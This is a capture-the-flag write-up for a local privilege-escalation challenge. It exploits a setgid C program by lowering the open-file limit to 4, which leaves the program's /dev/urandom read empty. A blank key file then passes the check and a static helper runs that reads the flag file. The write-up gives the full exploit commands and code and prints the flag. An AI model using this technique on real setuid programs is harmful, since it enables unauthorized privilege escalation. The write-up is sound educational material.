## Privesc Me (2) - "ALED" - Your randomness checker
We have the following code :
```c
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#define BUF_SIZE 128

int main(int argc, char const *argv[]) {

    if(argc != 3){
        printf("Usage : %s <key file> <binary to execute>", argv[0]);
    }
    setresgid(getegid(), getegid(), getegid());

    int fd;
    unsigned char randomness[BUF_SIZE];
    unsigned char your_randomness[BUF_SIZE];
    memset(randomness, 0, BUF_SIZE);
    memset(your_randomness, 0, BUF_SIZE);

    int fd_key = open(argv[1], O_RDONLY, 0400);
    read(fd_key, your_randomness, BUF_SIZE);

        fd = open("/dev/urandom", O_RDONLY, 0400);
    int nb_bytes = read(fd, randomness, BUF_SIZE);
    for (int i = 0; i < nb_bytes; i++) {
        randomness[i] = (randomness[i] + 0x20) % 0x7F;
    }

    for(int i = 0; i < BUF_SIZE; i++){
        if(randomness[i] != your_randomness[i]) {
            puts("Meh, you failed");
            return EXIT_FAILURE;
        }
    }
    close(fd);
    puts("Ok, well done");
    char* arg[2] = {argv[2], NULL};
    execve(argv[2], arg, NULL);
    return 0;
}
```
This script compare our input file with data in `/dev/urandom`. However `/dev/urandom` is close after the comparaison, so we can limit the number of file descriptor open in order to have null bytes in `randomness`. A similar technic as been use at [insomnihack](https://blog.scrt.ch/2015/03/24/insomnihack-finals-smtpwn-writeup/).

We set `RLIMIT_NOFILE` to 4 (soft limit), this limit correspond to the maximum number of file that the process can open. We set the hard limit as default value to 1048576.
```bash
touch /tmp/test
python3 -c "from resource import *; import os; setrlimit(RLIMIT_NOFILE, (4, 1048576,)); os.execve('/home/challenger/stage1/stage1', ['/home/challenger/stage1/stage1','/tmp/test', '/bin/bash'], {})"
```
We actually get `Ok, well done`, however executing commands doesn't works, we obtain the following error `/bin/bash: error while loading shared libraries: libtinfo.so.6: cannot open shared object file: Error 24`. This error means that we have too many files open.

By looking at build.sh we can see the `-static` options. This options means that all libraries are loaded inside the executable.
```bash
gcc stage1.c -static -o stage1
```

So we can build a static binary that change the maximum limit of open files and read the file.
```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/resource.h>

int main(void) {
	//https://www.geeksforgeeks.org/get-set-process-resource-limits-in-c/
    struct rlimit lim;

    lim.rlim_cur = 1024;
    lim.rlim_max = 1048576;

    setrlimit(RLIMIT_NOFILE, &lim);
	
    //https://solarianprogrammer.com/2019/04/03/c-programming-read-file-lines-fgets-getline-implement-portable-getline/
	FILE *fp = fopen("/home/challenger/stage1/flag.txt", "r");
    if(fp == NULL) {
        perror("Unable to open file!");
        exit(1);
    }

    char chunk[128];

    while(fgets(chunk, sizeof(chunk), fp) != NULL) {
        fputs(chunk, stdout);
    }

    fclose(fp);
}
```

```bash
touch /tmp/test
mkdir /tmp/stage1 && cd /tmp/stage1
gcc exploit.c -static -o exploit # gcc add executable right to the binary
python3 -c "from resource import *; import os; setrlimit(RLIMIT_NOFILE, (4, 1048576,)); os.execve('/home/challenger/stage1/stage1', ['/home/challenger/stage1/stage1','/tmp/test', '/tmp/stage1/exploit'], {})"
```


Flag : `FCSC{6bd1152e8dcefc368b08a3e82241bc83ea7a613a3322c6a2d818d408e1fb4d60}`
